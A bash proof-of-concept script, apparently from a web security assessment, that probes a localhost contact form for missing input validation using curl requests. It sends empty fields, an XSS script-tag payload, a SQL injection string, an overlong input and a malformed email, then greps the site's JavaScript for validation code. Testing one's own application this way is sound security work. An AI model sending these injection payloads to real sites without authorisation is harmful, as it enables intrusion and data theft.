#!/bin/bash

# POC: Missing Client-Side Input Validation in Contact Form
# This script demonstrates that the contact form accepts invalid input
# without any client-side validation checks

TARGET="http://localhost:8080"
FORM_PAGE="$TARGET/index.html"
SUBMIT_ENDPOINT="$TARGET/submit-form"

echo "==== POC: Missing Client-Side Input Validation ===="
echo ""
echo "Testing contact form validation bypass..."
echo ""

# Test 1: Submit empty fields (bypasses required attribute)
echo "[TEST 1] Submitting empty fields..."
curl -s -X POST "$SUBMIT_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=&email=&message=" \
  -w "\nHTTP Status: %{http_code}\n" \
  2>&1 | head -20

echo ""
echo "[TEST 2] Submitting XSS payload in name field..."
# Submit XSS payload that bypasses client-side validation
curl -s -X POST "$SUBMIT_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=<script>alert('XSS')</script>&email=test@example.com&message=Valid message content here" \
  -w "\nHTTP Status: %{http_code}\n" \
  2>&1 | head -20

echo ""
echo "[TEST 3] Submitting SQL injection payload in email field..."
# Submit SQL injection payload
curl -s -X POST "$SUBMIT_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=John Doe&email=test' OR '1'='1&message=Valid message content here" \
  -w "\nHTTP Status: %{http_code}\n" \
  2>&1 | head -20

echo ""
echo "[TEST 4] Submitting extremely long string (no length validation)..."
# Create a long string
LONG_STRING=$(printf 'A%.0s' {1..10000})
curl -s -X POST "$SUBMIT_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=$LONG_STRING&email=test@example.com&message=Valid message" \
  -w "\nHTTP Status: %{http_code}\n" \
  2>&1 | head -20

echo ""
echo "[TEST 5] Submitting with invalid email format (bypasses email type validation)..."
curl -s -X POST "$SUBMIT_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=John Doe&email=not-an-email&message=Valid message content" \
  -w "\nHTTP Status: %{http_code}\n" \
  2>&1 | head -20

echo ""
echo "[TEST 6] Checking JavaScript source for validation logic..."
echo "Fetching scripts.js from $TARGET/scripts.js"
SCRIPTS_CONTENT=$(curl -s "$TARGET/scripts.js")

# Check if validation functions exist
if echo "$SCRIPTS_CONTENT" | grep -q "validate"; then
    echo "✓ Validation function found"
else
    echo "✗ NO VALIDATION FUNCTION DETECTED"
fi

# Check for XSS prevention
if echo "$SCRIPTS_CONTENT" | grep -q "sanitize\|escape\|XSS"; then
    echo "✓ XSS prevention found"
else
    echo "✗ NO XSS PREVENTION DETECTED"
fi

# Check for length validation
if echo "$SCRIPTS_CONTENT" | grep -q "length\|maxLength"; then
    echo "✓ Length validation found"
else
    echo "✗ NO LENGTH VALIDATION DETECTED"
fi

echo ""
echo "==== ANALYSIS ===="
echo "The contact form accepts all input without validation."
echo "This allows:"
echo "  - Empty field submission (bypasses required attribute)"
echo "  - XSS payload injection"
echo "  - SQL injection syntax"
echo "  - Extremely long input strings"
echo "  - Invalid email formats"
echo ""
echo "Client-side validation is absent. Form relies solely on HTML5 browser-level constraints."
echo "======================================"